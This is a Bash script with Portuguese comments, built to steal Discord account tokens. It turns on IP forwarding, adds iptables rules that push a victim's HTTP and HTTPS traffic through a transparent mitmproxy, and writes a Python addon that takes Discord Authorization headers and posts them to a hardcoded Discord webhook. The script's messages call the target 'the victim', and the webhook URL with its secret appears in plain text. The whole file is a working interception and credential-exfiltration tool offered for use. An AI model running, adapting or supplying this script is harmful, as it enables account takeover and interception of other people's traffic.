#!/bin/bash

# ======= CONFIGURAÇÕES =======
HTML="index.html"
WEBHOOK_URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"
INTERCEPT_MODE=true   # true = captura tokens via proxy MITM; false = apenas servidor HTTP
# =============================

C='\033[0;36m' G='\033[0;32m' R='\033[0;31m' Y='\033[0;33m' N='\033[0m'

# Verifica se é root (necessário para redirecionamento de tráfego)
if [ "$EUID" -ne 0 ] && [ "$INTERCEPT_MODE" = true ]; then
    echo -e "${R}❌ Modo interceptação requer root. Execute com sudo.${N}"
    exit 1
fi

# Verifica dependências
if [ "$INTERCEPT_MODE" = true ]; then
    if ! command -v mitmdump &> /dev/null; then
        echo -e "${Y}📦 Instalando mitmproxy...${N}"
        pip install mitmproxy
    fi
fi

# Encontra porta livre para o servidor HTTP
PORT=8080
while ss -tlnp 2>/dev/null | grep -q ":$PORT "; do ((PORT++)); done

# Prepara o arquivo HTML
DIR=$(dirname "$HTML")
FILE=$(basename "$HTML")
[[ ! -f "$HTML" ]] && echo -e "${R}Arquivo não encontrado: $HTML${N}" && exit 1
if [[ "$FILE" != "index.html" ]]; then
    cp "$HTML" "$DIR/index.html"
    trap "rm -f '$DIR/index.html'" EXIT
fi

IP=$(hostname -I 2>/dev/null | awk '{print $1}')

echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
echo -e "${G} 🌐 Servidor HTTP: http://localhost:$PORT${N}"
echo -e "${G} 🌐 Rede local:    http://$IP:$PORT${N}"
if [ "$INTERCEPT_MODE" = true ]; then
    echo -e "${Y} 🔍 Modo interceptação ATIVO - Tokens do Discord serão capturados${N}"
    echo -e "${Y}    (requer que a vítima esteja na mesma rede e use HTTP proxy configurado)${N}"
fi
echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"

# Cria script Python para capturar tokens (usado pelo mitmproxy)
cat > /tmp/discord_sniffer.py <<'EOF'
from mitmproxy import http
import requests
import re
import json
import os

WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

def request(flow: http.HTTPFlow) -> None:
    # Verifica se é requisição para API do Discord
    if 'discord.com/api/v' in flow.request.pretty_host:
        auth = flow.request.headers.get("Authorization")
        if auth and re.match(r'[a-zA-Z0-9\-_]{24,}\.[a-zA-Z0-9\-_]{6,}\.[a-zA-Z0-9\-_]{27,}', auth):
            # Token encontrado!
            print(f"\n[!] Token capturado: {auth}")
            if WEBHOOK_URL:
                data = {
                    "content": f"**Token do Discord capturado:** ||{auth}||\n**URL:** {flow.request.pretty_url}"
                }
                try:
                    requests.post(WEBHOOK_URL, json=data, timeout=2)
                except:
                    pass
EOF

# Define variável de ambiente para o webhook
export WEBHOOK_URL="$WEBHOOK_URL"

# Inicia o servidor HTTP em background
cd "$DIR"
python3 -m http.server $PORT > /dev/null 2>&1 &
SERVER_PID=$!
sleep 2

if [ "$INTERCEPT_MODE" = true ]; then
    # Configura redirecionamento de tráfego (iptables) - apenas para a porta 80/443 da vítima
    # Isso fará com que todo tráfego HTTP/HTTPS passe pelo mitmproxy (porta 8081)
    echo -e "${Y}🔄 Configurando redirecionamento de tráfego (iptables)...${N}"
    sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
    iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8081
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8081
    iptables -t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8081
    iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8081
    
    # Inicia o mitmproxy em modo transparente na porta 8081
    echo -e "${G}🚀 Iniciando interceptador mitmproxy...${N}"
    mitmdump -q -s /tmp/discord_sniffer.py --mode transparent --listen-port 8081 &
    MITM_PID=$!
    sleep 3
    echo -e "${G}✅ Proxy MITM ativo na porta 8081${N}"
fi

# Abre o navegador automaticamente (opcional)
if command -v termux-open-url &>/dev/null; then
    termux-open-url "http://localhost:$PORT"
elif command -v xdg-open &>/dev/null; then
    xdg-open "http://localhost:$PORT" &>/dev/null &
fi

echo -e "${Y}💡 Pressione Ctrl+C para parar todos os serviços.${N}"

# Função de limpeza ao sair
cleanup() {
    echo -e "\n${R}🛑 Encerrando serviços...${N}"
    kill $SERVER_PID 2>/dev/null
    if [ "$INTERCEPT_MODE" = true ]; then
        kill $MITM_PID 2>/dev/null
        # Remove regras do iptables
        iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8081 2>/dev/null
        iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8081 2>/dev/null
        iptables -t nat -D OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8081 2>/dev/null
        iptables -t nat -D OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8081 2>/dev/null
        echo -e "${G}✅ Regras iptables removidas.${N}"
    fi
    rm -f /tmp/discord_sniffer.py
    exit 0
}
trap cleanup SIGINT SIGTERM

# Aguarda até que o servidor HTTP termine (normalmente nunca termina sozinho)
wait $SERVER_PID
